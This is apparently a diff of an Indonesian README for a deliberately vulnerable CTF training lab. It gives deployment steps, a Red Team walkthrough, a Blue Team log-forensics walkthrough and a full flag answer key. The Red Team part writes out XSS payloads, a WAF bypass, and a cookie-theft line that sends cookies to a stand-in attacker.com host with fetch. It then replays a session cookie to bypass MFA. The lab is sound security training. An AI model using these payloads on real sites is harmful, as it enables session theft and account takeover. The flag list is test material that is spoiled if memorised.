@@ -1,464 +1,645 @@
 # CTF Lab - Admin Feedback System
 
 > **Apa ini?**
-> Ini adalah lab CTF (Capture The Flag) — sebuah website yang **sengaja dibuat vulnerable (rentan)** untuk latihan keamanan siber.
-> Ada 2 jalur: Red Team (menyerang) dan Blue Team (investigasi log).
+> Ini adalah lab CTF (Capture The Flag) — sebuah website yang **sengaja dibuat rentan/bisa di-hack** untuk latihan keamanan siber.
+> Ada 2 jalur permainan:
+> - 🔴 **Red Team** = Menyerang website (jadi hacker)
+> - 🔵 **Blue Team** = Investigasi log serangan (jadi detektif)
 
 ---
 
 ## Daftar Isi
 
-1. [Penjelasan Singkat](#penjelasan-singkat)
-2. [Arsitektur](#arsitektur)
-3. [Cara Deploy](#cara-deploy)
-4. [Red Team Walkthrough](#red-team-walkthrough-jalur-menyerang)
-5. [Blue Team Walkthrough](#blue-team-walkthrough-jalur-investigasi)
-6. [Struktur File](#struktur-file)
-7. [Troubleshooting](#troubleshooting)
+1. [Konsep Dasar (Untuk Yang Belum Paham)](#konsep-dasar)
+2. [Arsitektur Sistem](#arsitektur-sistem)
+3. [Cara Deploy (Setup di Server)](#cara-deploy)
+4. [Red Team Walkthrough (Jalur Menyerang)](#-red-team-walkthrough-jalur-menyerang)
+5. [Blue Team Walkthrough (Jalur Investigasi)](#-blue-team-walkthrough-jalur-investigasi)
+6. [Daftar Semua Flag](#daftar-semua-flag)
+7. [Struktur File & Penjelasan](#struktur-file--penjelasan)
+8. [Troubleshooting](#troubleshooting)
+9. [Checklist Deliverable](#checklist-deliverable)
 
 ---
 
-## Penjelasan Singkat
+## Konsep Dasar
 
-### Apa yang dilakukan lab ini?
+### Apa itu CTF?
+CTF (Capture The Flag) = Kompetisi keamanan siber dimana peserta harus menemukan "flag" (kode rahasia) yang tersembunyi di sebuah sistem.
 
-Lab ini mensimulasikan skenario serangan ke "Admin Feedback System" dalam 3 fase:
+### Bagaimana lab ini bekerja?
 
-| Fase | Red Team (Attacker) | Blue Team (Defender) |
-|------|--------------------|--------------------|
-| 1 | Cari info (recon) | Baca log, identifikasi IP maling |
-| 2 | Bypass firewall + inject XSS | Cari alert WAF di log |
-| 3 | Masuk admin tanpa MFA | Temukan anomaly & decode bukti |
+```
+ATTACKER (Red Team)                     DEFENDER (Blue Team)
+       │                                        │
+       ▼                                        ▼
+Serang website ──────────────────► Jejak terekam di LOG
+       │                                        │
+       ▼                                        ▼
+Temukan flag di website             Temukan flag dari analisis log
+```
 
-Setiap "temuan" menghasilkan flag format: `SCENARIO75{jawaban}`
+**Analoginya:**
+- Website ini = Toko yang sengaja pintunya lemah
+- Red Team = Maling yang coba masuk
+- Blue Team = Satpam yang baca CCTV setelah kejadian
+- Flag = Stempel bukti di setiap checkpoint
+
+### Format flag:
+```
+SCENARIO75{jawaban}
+```
+Contoh: `SCENARIO75{Node.js}`, `SCENARIO75{/dashboard}`
 
 ---
 
-## Arsitektur
+## Arsitektur Sistem
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    Server / VM                           │
-│  ┌───────────┐     ┌───────────────┐    ┌───────────┐  │
-│  │   Nginx   │────▶│  Node.js App  │    │   Logs    │  │
-│  │  :80      │     │  :3000        │    │ /opt/admin │  │
-│  └───────────┘     └───────────────┘    │  /logs/   │  │
-│                                          └───────────┘  │
-└─────────────────────────────────────────────────────────┘
+┌──────────────────────────────────────────────────────────────┐
+│                    SERVER (Linux VM)                          │
+│                                                              │
+│   ┌─────────────────┐                                       │
+│   │   Nginx         │ ← Pintu masuk, terima traffic         │
+│   │   Port 3075     │   dari internet                       │
+│   └────────┬────────┘                                       │
+│            │                                                 │
+│            ▼                                                 │
+│   ┌─────────────────┐     ┌─────────────────┐               │
+│   │   Node.js App   │     │   SSH Server    │               │
+│   │   Port 3000     │     │   Port 2275     │               │
+│   │   (website)     │     │   (Blue Team)   │               │
+│   └────────┬────────┘     └─────────────────┘               │
+│            │                                                 │
+│            ▼                                                 │
+│   ┌─────────────────┐                                       │
+│   │   /opt/admin/   │                                       │
+│   │   logs/         │ ← Rekaman semua aktivitas             │
+│   │   - access.log  │                                       │
+│   │   - error.log   │                                       │
+│   └─────────────────┘                                       │
+└──────────────────────────────────────────────────────────────┘
 ```
+
+**4 Container Docker yang jalan:**
+| Container | Fungsi |
+|-----------|--------|
+| `ctf-nginx` | Pintu depan website (port 3075) |
+| `ctf-feedback-app` | Aplikasi web Node.js |
+| `ctf-ssh` | SSH server untuk Blue Team (port 2275) |
+| `ctf-log-injector` | Inject log palsu saat pertama deploy |
 
 ---
 
 ## Cara Deploy
 
 ### Yang Dibutuhkan
-- Server Linux (Ubuntu/Debian) — bisa VPS, VM Proxmox, atau dedicated server
-- Docker & Docker Compose sudah terinstall
-- Akses SSH ke server
+- ✅ Server Linux (Ubuntu/Debian) — VPS, VM Proxmox, atau dedicated
+- ✅ Docker & Docker Compose terinstall di server
+- ✅ Akses SSH ke server
 
-### Langkah Deploy
+### Langkah-Langkah (Copy-Paste Aja)
 
 ```bash
-# 1. SSH ke server
+# 1. SSH ke server kamu
 ssh user@IP_SERVER
 
-# 2. Clone atau copy project ke server
+# 2. Clone project dari GitHub
 git clone <url-repo> ~/ctf-lab
 cd ~/ctf-lab
 
-# 3. Jalankan semua container
+# 3. Jalankan semua container (build + start)
 docker-compose up -d --build
 
-# 4. Inject log simulasi serangan (untuk Blue Team)
-docker run --rm -v ctf-lab_logs_data:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh
+# 4. Inject log simulasi serangan
+# (Cek nama volume dulu)
+docker volume ls | grep logs
+# Lalu jalankan (ganti nama volume sesuai output di atas):
+docker run --rm -v NAMA_VOLUME:/opt/admin/logs -v ~/ctf-lab/scripts:/scripts alpine sh /scripts/generate-logs.sh
 ```
 
-### Akses Setelah Deploy
-
-| Service | Cara Akses |
-|---------|-----------|
-| Web App | `http://IP_SERVER:3075` |
-| SSH (Blue Team) | `ssh -p 2275 analyst@IP_SERVER` (password: `blue_team_rocks`) |
-| Logs | `/opt/admin/logs/` (dari dalam SSH) |
-
-### Cek Apakah Sudah Jalan
+### Verifikasi Berhasil
 
 ```bash
-# Cek container aktif
+# Cek semua container aktif (harus ada 3: app, nginx, ssh)
 docker-compose ps
 
-# Cek website bisa diakses
-curl -I http://localhost:8080
+# Test website
+curl -I http://localhost:3075
+# Harus muncul: HTTP/1.1 200 OK + X-Powered-By: Node.js
 
-# Cek log sudah ter-generate
-docker exec ctf-feedback-app cat /opt/admin/logs/access.log
-docker exec ctf-feedback-app cat /opt/admin/logs/error.log
+# Test SSH Blue Team
+ssh -p 2275 analyst@localhost
+# Password: blue_team_rocks
+# Lalu cek: cat /opt/admin/logs/access.log | grep "10.10.14.50"
 ```
 
-Kalau semua OK, website bisa diakses di: `http://IP_SERVER:3075`
+### Akses Dari Luar
+
+| Service | URL/Command |
+|---------|------------|
+| 🌐 Website | `http://IP_SERVER:3075` |
+| 🔑 SSH Blue Team | `ssh -p 2275 analyst@IP_SERVER` (pass: `blue_team_rocks`) |
 
 ---
 
-## Red Team Walkthrough (Jalur Menyerang)
+## 🔴 Red Team Walkthrough (Jalur Menyerang)
 
-> **Skenario:** Kamu adalah attacker. Tugasmu adalah menembus website ini sampai masuk ke halaman admin.
+> **Cerita:** Kamu adalah hacker. Target kamu adalah website "Admin Feedback System".
+> Tujuan: Masuk ke halaman admin (/dashboard) tanpa punya password.
 
-### Fase 1: Reconnaissance (Ngumpulin Info)
+---
 
-**Langkah 1 — Cek teknologi apa yang dipakai website ini**
+### FASE 1: Reconnaissance (Kumpulkan Informasi)
 
-Jalankan:
+Sebelum nyerang, kumpulkan info dulu tentang target.
+
+---
+
+#### Langkah 1: Cek teknologi backend
+
+**Apa yang dilakukan:** Kirim request ke website, lihat header response-nya.
+
 ```bash
 curl -I http://IP_SERVER:3075
 ```
 
-Lihat baris `X-Powered-By: Node.js` — ini memberitahu bahwa backend pakai Node.js.
+**Yang dicari:** Baris `X-Powered-By`
 
-> 🚩 Flag: `SCENARIO75{Node.js}`
+**Hasil:** `X-Powered-By: Node.js` → Website pakai Node.js
+
+> 🚩 **Flag: `SCENARIO75{Node.js}`**
 
 ---
 
-**Langkah 2 — Cari halaman tersembunyi dari robots.txt**
+#### Langkah 2: Buka robots.txt
+
+**Apa yang dilakukan:** File `robots.txt` biasanya berisi daftar halaman yang "disembunyikan" dari search engine. Ironisnya, ini jadi petunjuk buat hacker.
 
 Buka di browser: `http://IP_SERVER:3075/robots.txt`
 
-Hasilnya:
+**Hasil:**
 ```
 Disallow: /api/verify-mfa
 Disallow: /dashboard
 ```
 
-Ini bocoran — ada endpoint MFA dan halaman admin dashboard.
+**Artinya:** Ada endpoint MFA verification dan halaman admin dashboard!
 
-> 🚩 Flag: `SCENARIO75{/api/verify-mfa}`
-> 🚩 Flag: `SCENARIO75{/dashboard}`
-
----
-
-**Langkah 3 — Lihat source code HTML**
-
-Di browser, klik kanan → "View Page Source". Cari komentar ASCII art yang bilang:
-```
->> Hint: Have you checked robots.txt? <<
-```
-
-> 🚩 Flag: `SCENARIO75{robots.txt}`
+> 🚩 **Flag: `SCENARIO75{/api/verify-mfa}`**
+> 🚩 **Flag: `SCENARIO75{/dashboard}`**
 
 ---
 
-**Langkah 4 — Cek cookie yang diberikan website**
+#### Langkah 3: Lihat source code HTML
 
-Jalankan:
+**Apa yang dilakukan:** Klik kanan di browser → "View Page Source"
+
+**Yang dicari:** Ada komentar HTML tersembunyi berisi ASCII art:
+```html
+<!--
+    ║   >> Hint: Have you checked robots.txt? <<               ║
+-->
+```
+
+> 🚩 **Flag: `SCENARIO75{robots.txt}`**
+
+---
+
+#### Langkah 4: Perhatikan cookie yang dikasih website
+
+**Apa yang dilakukan:** Website otomatis kasih cookie (kartu identitas sementara) saat pertama kali diakses.
+
 ```bash
 curl -v http://IP_SERVER:3075 2>&1 | grep Set-Cookie
 ```
 
-Output: `Set-Cookie: pre_mfa_session=pending_mfa_verification`
+**Hasil:** `Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/`
 
-Website otomatis kasih cookie saat pertama kali diakses.
+**Artinya:** Cookie bernama `pre_mfa_session` dengan nilai `pending_mfa_verification`
 
-> 🚩 Flag: `SCENARIO75{pre_mfa_session}`
-> 🚩 Flag: `SCENARIO75{pending_mfa_verification}`
-
----
-
-### Fase 2: WAF Bypass + XSS (Bypass Firewall)
-
-**Langkah 5 — Cari tahu method pengiriman form**
-
-Form feedback mengirim data lewat method POST.
-
-> 🚩 Flag: `SCENARIO75{POST}`
+> 🚩 **Flag: `SCENARIO75{pre_mfa_session}`**
+> 🚩 **Flag: `SCENARIO75{pending_mfa_verification}`**
 
 ---
 
-**Langkah 6 — Coba serangan `<script>` (akan diblock)**
+### FASE 2: WAF Bypass + XSS (Tembus Firewall)
 
-Jalankan:
+Website punya "satpam" bernama WAF (Web Application Firewall). Kita harus cari cara bypass.
+
+---
+
+#### Langkah 5: Form pakai method apa?
+
+**Jawaban:** Form feedback mengirim data lewat **POST** method.
+
+> 🚩 **Flag: `SCENARIO75{POST}`**
+
+---
+
+#### Langkah 6: Coba serangan standar (akan diblock)
+
+**Apa yang dilakukan:** Kirim payload `<script>` lewat form feedback.
+
 ```bash
 curl -X POST http://IP_SERVER:3075/api/feedback \
   -H "Content-Type: application/json" \
   -d '{"feedback":"<script>alert(1)</script>"}'
 ```
 
-Hasilnya: status **403** — WAF (firewall) memblokir serangan.
+**Hasil:** Status **403 Forbidden** — WAF mendeteksi dan memblokir!
 
-> 🚩 Flag: `SCENARIO75{403}`
+> 🚩 **Flag: `SCENARIO75{403}`**
 
 ---
 
-**Langkah 7 — Bypass WAF pakai `<svg>` (berhasil lolos!)**
+#### Langkah 7: Bypass WAF pakai `<svg>`
 
-WAF cuma mengenal `<script>`. Pakai tag HTML5 lain:
+**Apa yang dilakukan:** WAF cuma kenal `<script>`. Pakai tag HTML5 lain yang juga bisa jalankan JavaScript.
+
 ```bash
 curl -X POST http://IP_SERVER:3075/api/feedback \
   -H "Content-Type: application/json" \
   -d '{"feedback":"<svg onload=alert(1)>"}'
 ```
 
-Hasilnya: status **200** — WAF tidak mendeteksi, serangan lolos!
+**Hasil:** Status **200 OK** — WAF tidak mendeteksi! Serangan lolos!
 
-> 🚩 Flag: `SCENARIO75{<svg>}`
+**Kenapa bisa lolos:** WAF hanya mengecek `<script>`, tidak mengecek `<svg>`, `<img>`, dll.
+
+> 🚩 **Flag: `SCENARIO75{<svg>}`**
 
 ---
 
-**Langkah 8 — Teknik obfuscation untuk curi cookie**
+#### Langkah 8: Obfuscation (Samarin kode jahat)
 
-WAF juga block kata `document.cookie`. Solusinya pakai bracket notation:
+**Masalah:** WAF juga block kata `document.cookie` (cara baca cookie di JavaScript).
+
+**Solusi:** Pecah kata-katanya pakai bracket notation:
 ```javascript
 window['docu'+'ment']['coo'+'kie']
 ```
-WAF tidak bisa mendeteksi ini karena kata-katanya dipecah.
 
-> 🚩 Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`
+WAF baca ini sebagai teks biasa, tapi browser tetap menjalankannya sebagai `document.cookie`.
 
----
-
-**Langkah 9 — Cookie bisa dicuri karena HttpOnly = false**
-
-Cookie `pre_mfa_session` tidak dilindungi flag HttpOnly, jadi JavaScript bisa membacanya.
-
-> 🚩 Flag: `SCENARIO75{False}`
+> 🚩 **Flag: `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`**
 
 ---
 
-**Langkah 10 — Kirim cookie curian pakai fetch API**
+#### Langkah 9: Cookie bisa dicuri
 
-Attacker menggunakan `fetch()` untuk mengirim cookie ke server miliknya.
+**Kenapa:** Cookie `pre_mfa_session` diset dengan `HttpOnly = false`. Artinya JavaScript di browser bisa membaca cookie ini.
 
-> 🚩 Flag: `SCENARIO75{fetch}`
+Kalau `HttpOnly = true` → JavaScript tidak bisa baca cookie → aman.
+Kalau `HttpOnly = false` → JavaScript bisa baca → bisa dicuri!
+
+> 🚩 **Flag: `SCENARIO75{False}`**
 
 ---
 
-### Fase 3: MFA Bypass (Masuk Jadi Admin)
+#### Langkah 10: Kirim cookie curian ke server attacker
 
-**Langkah 11 — Pakai cookie curian untuk akses dashboard**
+**Cara:** Attacker pakai `fetch()` API untuk mengirim cookie ke server miliknya.
 
-Dengan cookie admin yang sudah dicuri, akses dashboard langsung:
+Payload lengkapnya (yang dikirim lewat `<svg>`):
+```html
+<svg onload=fetch('http://attacker.com/steal?c='+window['docu'+'ment']['coo'+'kie'])>
+```
+
+> 🚩 **Flag: `SCENARIO75{fetch}`**
+
+---
+
+### FASE 3: MFA Bypass (Masuk Tanpa Verifikasi)
+
+Sekarang attacker punya cookie admin yang dicuri. Tinggal pakai.
+
+---
+
+#### Langkah 11: Replay cookie curian ke dashboard
+
+**Apa yang dilakukan:** Akses halaman admin sambil kirim cookie admin.
+
 ```bash
 curl http://IP_SERVER:3075/dashboard \
   -H "Cookie: adm_sess=adm_sess_7f3c2d1a9b4e8f6c"
 ```
 
-Server langsung kasih akses **tanpa verifikasi MFA** (2-factor auth di-skip).
+**Hasil:** Server kasih akses! Tidak ada pengecekan MFA!
 
-> 🚩 Flag: `SCENARIO75{/api/verify-mfa}`
+**Kenapa bisa:** Server cuma cek "apakah cookie valid?" tanpa cek "apakah user ini sudah lewat MFA?"
 
----
-
-**Langkah 12 — Prefix session admin**
-
-Cookie admin menggunakan prefix `adm_sess`.
-
-> 🚩 Flag: `SCENARIO75{adm_sess}`
+> 🚩 **Flag: `SCENARIO75{/api/verify-mfa}`** (endpoint yang di-skip)
 
 ---
 
-**Langkah 13 — XSS ter-render di dashboard**
+#### Langkah 12: Prefix cookie admin
 
-Payload XSS yang dikirim sebelumnya muncul di dalam elemen `<div class="xss-payload">`.
+Cookie admin dimulai dengan prefix `adm_sess`.
 
-> 🚩 Flag: `SCENARIO75{xss-payload}`
+> 🚩 **Flag: `SCENARIO75{adm_sess}`**
 
 ---
 
-**Langkah 14 — FLAG FINAL RED TEAM**
+#### Langkah 13: XSS payload terlihat di dashboard
 
-Di halaman dashboard, terlihat:
+Payload `<svg>` yang dikirim di langkah 7 muncul di dashboard dalam element:
+```html
+<div class="xss-payload">..payload disini..</div>
+```
+
+> 🚩 **Flag: `SCENARIO75{xss-payload}`**
+
+---
+
+#### Langkah 14: FLAG FINAL RED TEAM 🏁
+
+Di halaman dashboard, tertulis jelas:
+
 ```
 SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
 ```
 
-> 🏁 **Selamat! Red Team path selesai.**
+> 🏆 **Red Team selesai! Kamu berhasil masuk admin tanpa password!**
 
 ---
 
-## Blue Team Walkthrough (Jalur Investigasi)
+## 🔵 Blue Team Walkthrough (Jalur Investigasi)
 
-> **Skenario:** Kamu adalah security analyst. Ada insiden keamanan terjadi. Tugasmu menganalisis log untuk mencari tahu apa yang terjadi.
+> **Cerita:** Kamu adalah security analyst. Ada insiden keamanan. Tugasmu: baca log, cari tahu siapa yang menyerang, kapan, dan bagaimana.
 
-### Fase 1: Log Forensics (Baca Rekaman)
-
-**Langkah 1 — Temukan dimana log disimpan**
-
+**Cara masuk:**
 ```bash
-docker exec ctf-feedback-app ls /opt/admin/logs/
+ssh -p 2275 analyst@IP_SERVER
+# Password: blue_team_rocks
 ```
 
-Hasilnya: `access.log` dan `error.log`
+---
 
-> 🚩 Flag: `SCENARIO75{/opt/admin/logs}`
+### FASE 1: Log Forensics (Baca Rekaman Kejadian)
 
 ---
 
-**Langkah 2 — Identifikasi IP attacker**
+#### Langkah 1: Temukan lokasi log
 
 ```bash
-docker exec ctf-feedback-app cat /opt/admin/logs/access.log
+ls /opt/admin/logs/
 ```
 
-Lihat IP yang mencurigakan: `10.10.14.50` (bukan IP internal perusahaan)
-User-Agent-nya: `Mozilla/5.0`
+**Hasil:** `access.log` dan `error.log`
 
-> 🚩 Flag: `SCENARIO75{10.10.14.50}`
-> 🚩 Flag: `SCENARIO75{Mozilla/5.0}`
+> 🚩 **Flag: `SCENARIO75{/opt/admin/logs}`**
 
 ---
 
-**Langkah 3 — Cari kapan attacker berhasil akses dashboard**
+#### Langkah 2: Identifikasi IP penyerang
 
 ```bash
-docker exec ctf-feedback-app grep "10.10.14.50.*dashboard.*200" /opt/admin/logs/access.log
+cat /opt/admin/logs/access.log
 ```
 
-Terlihat akses sukses (status 200) pada jam `18:51:55`.
+**Cara identifikasi:**
+- `192.168.1.100` → IP internal, admin sah (traffic normal)
+- `10.10.14.50` → IP asing, BUKAN dari jaringan internal → **ini attackernya!**
 
-> 🚩 Flag: `SCENARIO75{200}`
-> 🚩 Flag: `SCENARIO75{18:51:55}`
+User-Agent attacker: `Mozilla/5.0`
+
+> 🚩 **Flag: `SCENARIO75{10.10.14.50}`**
+> 🚩 **Flag: `SCENARIO75{Mozilla/5.0}`**
 
 ---
 
-**Langkah 4 — Temukan bukti exfiltrasi data**
+#### Langkah 3: Kapan attacker berhasil masuk dashboard?
 
-Di baris log yang sama, ada string aneh di kolom terakhir:
+```bash
+grep "10.10.14.50.*dashboard.*200" /opt/admin/logs/access.log
+```
+
+**Hasil:** Ada entry dengan status **200** (berhasil) pada jam **18:51:55**
+
+> 🚩 **Flag: `SCENARIO75{200}`**
+> 🚩 **Flag: `SCENARIO75{18:51:55}`**
+
+---
+
+#### Langkah 4: Temukan bukti data curian
+
+Di baris log dashboard 200, ada string aneh di kolom X-Forwarded-For:
 ```
 UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
 ```
 
-Ini adalah data ter-encode yang dikirim attacker.
+Ini adalah data ter-encode yang dikirim attacker keluar.
 
-> 🚩 Flag: `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`
+> 🚩 **Flag: `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`**
 
 ---
 
-### Fase 2: Threat Hunting (Cari Pola Serangan)
+### FASE 2: Threat Hunting (Cari Pola Serangan)
 
-**Langkah 5 — Identifikasi traffic normal**
+---
+
+#### Langkah 5: Identifikasi traffic normal (baseline)
 
 ```bash
-docker exec ctf-feedback-app grep "192.168.1.100" /opt/admin/logs/access.log
+grep "192.168.1.100" /opt/admin/logs/access.log
 ```
 
-IP `192.168.1.100` adalah admin yang sah (traffic normal).
+IP `192.168.1.100` = admin yang sah, melakukan aktivitas normal.
 
-> 🚩 Flag: `SCENARIO75{192.168.1.100}`
-
----
-
-**Langkah 6 — Tentukan subnet attacker**
-
-IP `10.10.14.50` berada di subnet `10.10.14.0/24`.
-
-> 🚩 Flag: `SCENARIO75{10.10.14.0/24}`
+> 🚩 **Flag: `SCENARIO75{192.168.1.100}`**
 
 ---
 
-**Langkah 7 — Cek alert WAF di error.log**
+#### Langkah 6: Subnet attacker
+
+IP `10.10.14.50` berada di subnet `10.10.14.0/24`
+(Semua IP dari 10.10.14.1 sampai 10.10.14.254)
+
+> 🚩 **Flag: `SCENARIO75{10.10.14.0/24}`**
+
+---
+
+#### Langkah 7: Cek alert firewall (WAF)
 
 ```bash
-docker exec ctf-feedback-app grep "WAF BLOCK" /opt/admin/logs/error.log | head -1
+grep "WAF BLOCK" /opt/admin/logs/error.log
 ```
 
-Block pertama terjadi jam `18:50:15` untuk payload `<script>`.
+**Hasil:** Block pertama tercatat di `error.log` pada jam **18:50:15** untuk payload `<script>`.
 
-> 🚩 Flag: `SCENARIO75{/opt/admin/logs/error.log}`
-> 🚩 Flag: `SCENARIO75{<script>}`
-> 🚩 Flag: `SCENARIO75{18:50:15}`
+> 🚩 **Flag: `SCENARIO75{/opt/admin/logs/error.log}`**
+> 🚩 **Flag: `SCENARIO75{<script>}`**
+> 🚩 **Flag: `SCENARIO75{18:50:15}`**
 
 ---
 
-**Langkah 8 — Apakah attacker pernah lewat MFA?**
+#### Langkah 8: Apakah attacker pernah lewat MFA?
 
 ```bash
-docker exec ctf-feedback-app grep "10.10.14.50.*verify-mfa" /opt/admin/logs/access.log
+grep "10.10.14.50.*verify-mfa" /opt/admin/logs/access.log
 ```
 
-Hasilnya: **kosong** — attacker tidak pernah menyentuh endpoint MFA. Artinya dia bypass.
+**Hasil:** Kosong! Attacker **tidak pernah** mengakses endpoint MFA → dia bypass!
 
-> 🚩 Flag: `SCENARIO75{No}`
+> 🚩 **Flag: `SCENARIO75{No}`**
 
 ---
 
-### Fase 3: Incident Response (Analisis Lanjutan)
+### FASE 3: Incident Response (Analisis Mendalam)
 
-**Langkah 9 — Analisis encoding string mencurigakan**
+---
+
+#### Langkah 9: Analisis string ter-encode
+
+String: `UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0`
+
+**Tanda-tanda Base64:**
+- Hanya terdiri dari huruf besar, kecil, angka, dan +/=
+- Panjangnya: **44 karakter**
 
 ```bash
-echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | wc -c
+echo -n "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | wc -c
 ```
 
-String tersebut ter-encode dalam format Base64, panjangnya 44 karakter.
-
-> 🚩 Flag: `SCENARIO75{Base64}`
-> 🚩 Flag: `SCENARIO75{44}`
+> 🚩 **Flag: `SCENARIO75{Base64}`**
+> 🚩 **Flag: `SCENARIO75{44}`**
 
 ---
 
-**Langkah 10 — Cek level severity tertinggi**
+#### Langkah 10: Cek severity level
 
 ```bash
-docker exec ctf-feedback-app grep "CRITICAL" /opt/admin/logs/error.log
+grep "CRITICAL" /opt/admin/logs/error.log
 ```
 
-Event cookie reuse (cookie dipakai ulang oleh IP berbeda) ditandai level **CRITICAL**.
+Event "cookie reuse" (cookie dipakai ulang dari IP berbeda) ditandai level **CRITICAL**.
 
-> 🚩 Flag: `SCENARIO75{CRITICAL}`
+> 🚩 **Flag: `SCENARIO75{CRITICAL}`**
 
 ---
 
-**Langkah 11 — Cari anomaly di timestamp tertentu**
+#### Langkah 11: Cari anomaly spesifik
 
 ```bash
-docker exec ctf-feedback-app grep "18:53:10" /opt/admin/logs/error.log
+grep "18:53:10" /opt/admin/logs/error.log
 ```
 
-Tertulis: `Authentication bypass anomaly` — konfirmasi bahwa ada bypass authentication.
+**Hasil:** `[CRITICAL] Authentication bypass anomaly: admin session accessed without /api/verify-mfa completion`
 
-> 🚩 Flag: `SCENARIO75{18:53:10}`
-> 🚩 Flag: `SCENARIO75{Authentication bypass anomaly}`
+> 🚩 **Flag: `SCENARIO75{18:53:10}`**
+> 🚩 **Flag: `SCENARIO75{Authentication bypass anomaly}`**
 
 ---
 
-**Langkah 12 — FLAG FINAL BLUE TEAM**
+#### Langkah 12: FLAG FINAL BLUE TEAM 🏁
 
-Decode string Base64 yang ditemukan di langkah 4:
+Decode string Base64 dari langkah 4:
 ```bash
 echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
 ```
 
-> 🏁 Flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`
+> 🏆 **Flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`**
 
 ---
 
-## Struktur File
+## Daftar Semua Flag
+
+### Red Team (14 flag)
+| # | Flag | Ditemukan di |
+|---|------|-------------|
+| 1 | `SCENARIO75{Node.js}` | Header HTTP |
+| 2 | `SCENARIO75{/api/verify-mfa}` | robots.txt |
+| 3 | `SCENARIO75{/dashboard}` | robots.txt |
+| 4 | `SCENARIO75{robots.txt}` | HTML source code |
+| 5 | `SCENARIO75{pre_mfa_session}` | Cookie name |
+| 6 | `SCENARIO75{pending_mfa_verification}` | Cookie value |
+| 7 | `SCENARIO75{POST}` | Form method |
+| 8 | `SCENARIO75{403}` | WAF block status |
+| 9 | `SCENARIO75{<svg>}` | WAF bypass tag |
+| 10 | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` | Obfuscation |
+| 11 | `SCENARIO75{False}` | HttpOnly setting |
+| 12 | `SCENARIO75{fetch}` | Exfiltration API |
+| 13 | `SCENARIO75{adm_sess}` | Session prefix |
+| 14 | `SCENARIO75{xss-payload}` | CSS class name |
+| 🏁 | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` | Dashboard |
+
+### Blue Team (18 flag)
+| # | Flag | Ditemukan di |
+|---|------|-------------|
+| 1 | `SCENARIO75{/opt/admin/logs}` | Log location |
+| 2 | `SCENARIO75{10.10.14.50}` | Attacker IP |
+| 3 | `SCENARIO75{Mozilla/5.0}` | User-Agent |
+| 4 | `SCENARIO75{200}` | Dashboard status code |
+| 5 | `SCENARIO75{18:51:55}` | Dashboard access time |
+| 6 | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}` | Base64 string |
+| 7 | `SCENARIO75{192.168.1.100}` | Legitimate admin IP |
+| 8 | `SCENARIO75{10.10.14.0/24}` | Attacker subnet |
+| 9 | `SCENARIO75{/opt/admin/logs/error.log}` | WAF alert file |
+| 10 | `SCENARIO75{<script>}` | First blocked payload |
+| 11 | `SCENARIO75{18:50:15}` | First WAF block time |
+| 12 | `SCENARIO75{No}` | Attacker MFA access |
+| 13 | `SCENARIO75{Base64}` | Encoding type |
+| 14 | `SCENARIO75{44}` | Encoded string length |
+| 15 | `SCENARIO75{CRITICAL}` | Severity level |
+| 16 | `SCENARIO75{18:53:10}` | Anomaly timestamp |
+| 17 | `SCENARIO75{Authentication bypass anomaly}` | Warning message |
+| 🏁 | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` | Decoded Base64 |
+
+---
+
+## Struktur File & Penjelasan
 
 ```
 ctf-lab/
-├── docker-compose.yml      ← Menjalankan semua container sekaligus
-├── README.md               ← Dokumentasi ini
-├── .gitignore
-├── app/
-│   ├── Dockerfile          ← Instruksi build container aplikasi
-│   ├── .dockerignore
-│   ├── package.json        ← Daftar dependency Node.js
-│   ├── server.js           ← Aplikasi utama (route, cookie, logic)
+│
+├── docker-compose.yml          ← "Remote control" semua container
+│                                  (1 command = 4 container nyala)
+│
+├── README.md                   ← File dokumentasi ini
+├── .gitignore                  ← Daftar file yang gak perlu di-upload ke Git
+│
+├── app/                        ← FOLDER APLIKASI WEBSITE
+│   ├── Dockerfile              ← Resep bikin container aplikasi
+│   ├── .dockerignore           ← File yang gak perlu masuk container
+│   ├── package.json            ← Daftar library Node.js yang dipakai
+│   ├── server.js               ← FILE UTAMA — semua logic website di sini
+│   │                              (route, cookie, MFA bypass logic)
 │   ├── middleware/
-│   │   └── waf.js          ← Firewall sederhana (sengaja bisa di-bypass)
+│   │   └── waf.js              ← "Satpam bodoh" (firewall yang bisa di-bypass)
 │   ├── public/
-│   │   ├── robots.txt      ← File yang bocorkan path rahasia
+│   │   ├── robots.txt          ← File yang bocorkan path rahasia
 │   │   └── css/
-│   │       └── style.css
+│   │       └── style.css       ← Styling halaman
 │   └── views/
-│       ├── index.ejs       ← Halaman utama + form feedback
-│       ├── dashboard.ejs   ← Halaman admin (target akhir attacker)
-│       └── unauthorized.ejs ← Halaman 401 (akses ditolak)
-├── nginx/
-│   └── nginx.conf          ← Konfigurasi reverse proxy
-├── logs/                   ← Volume untuk menyimpan log
-└── scripts/
-    ├── generate-logs.sh    ← Script inject log simulasi serangan
-    └── setup-proxmox.sh    ← Script otomasi setup server
+│       ├── index.ejs           ← Halaman utama (form feedback)
+│       ├── dashboard.ejs       ← Halaman admin (target akhir attacker)
+│       └── unauthorized.ejs    ← Halaman "akses ditolak" (401)
+│
+├── nginx/                      ← FOLDER KONFIGURASI NGINX
+│   └── nginx.conf              ← Setting reverse proxy + format log
+│
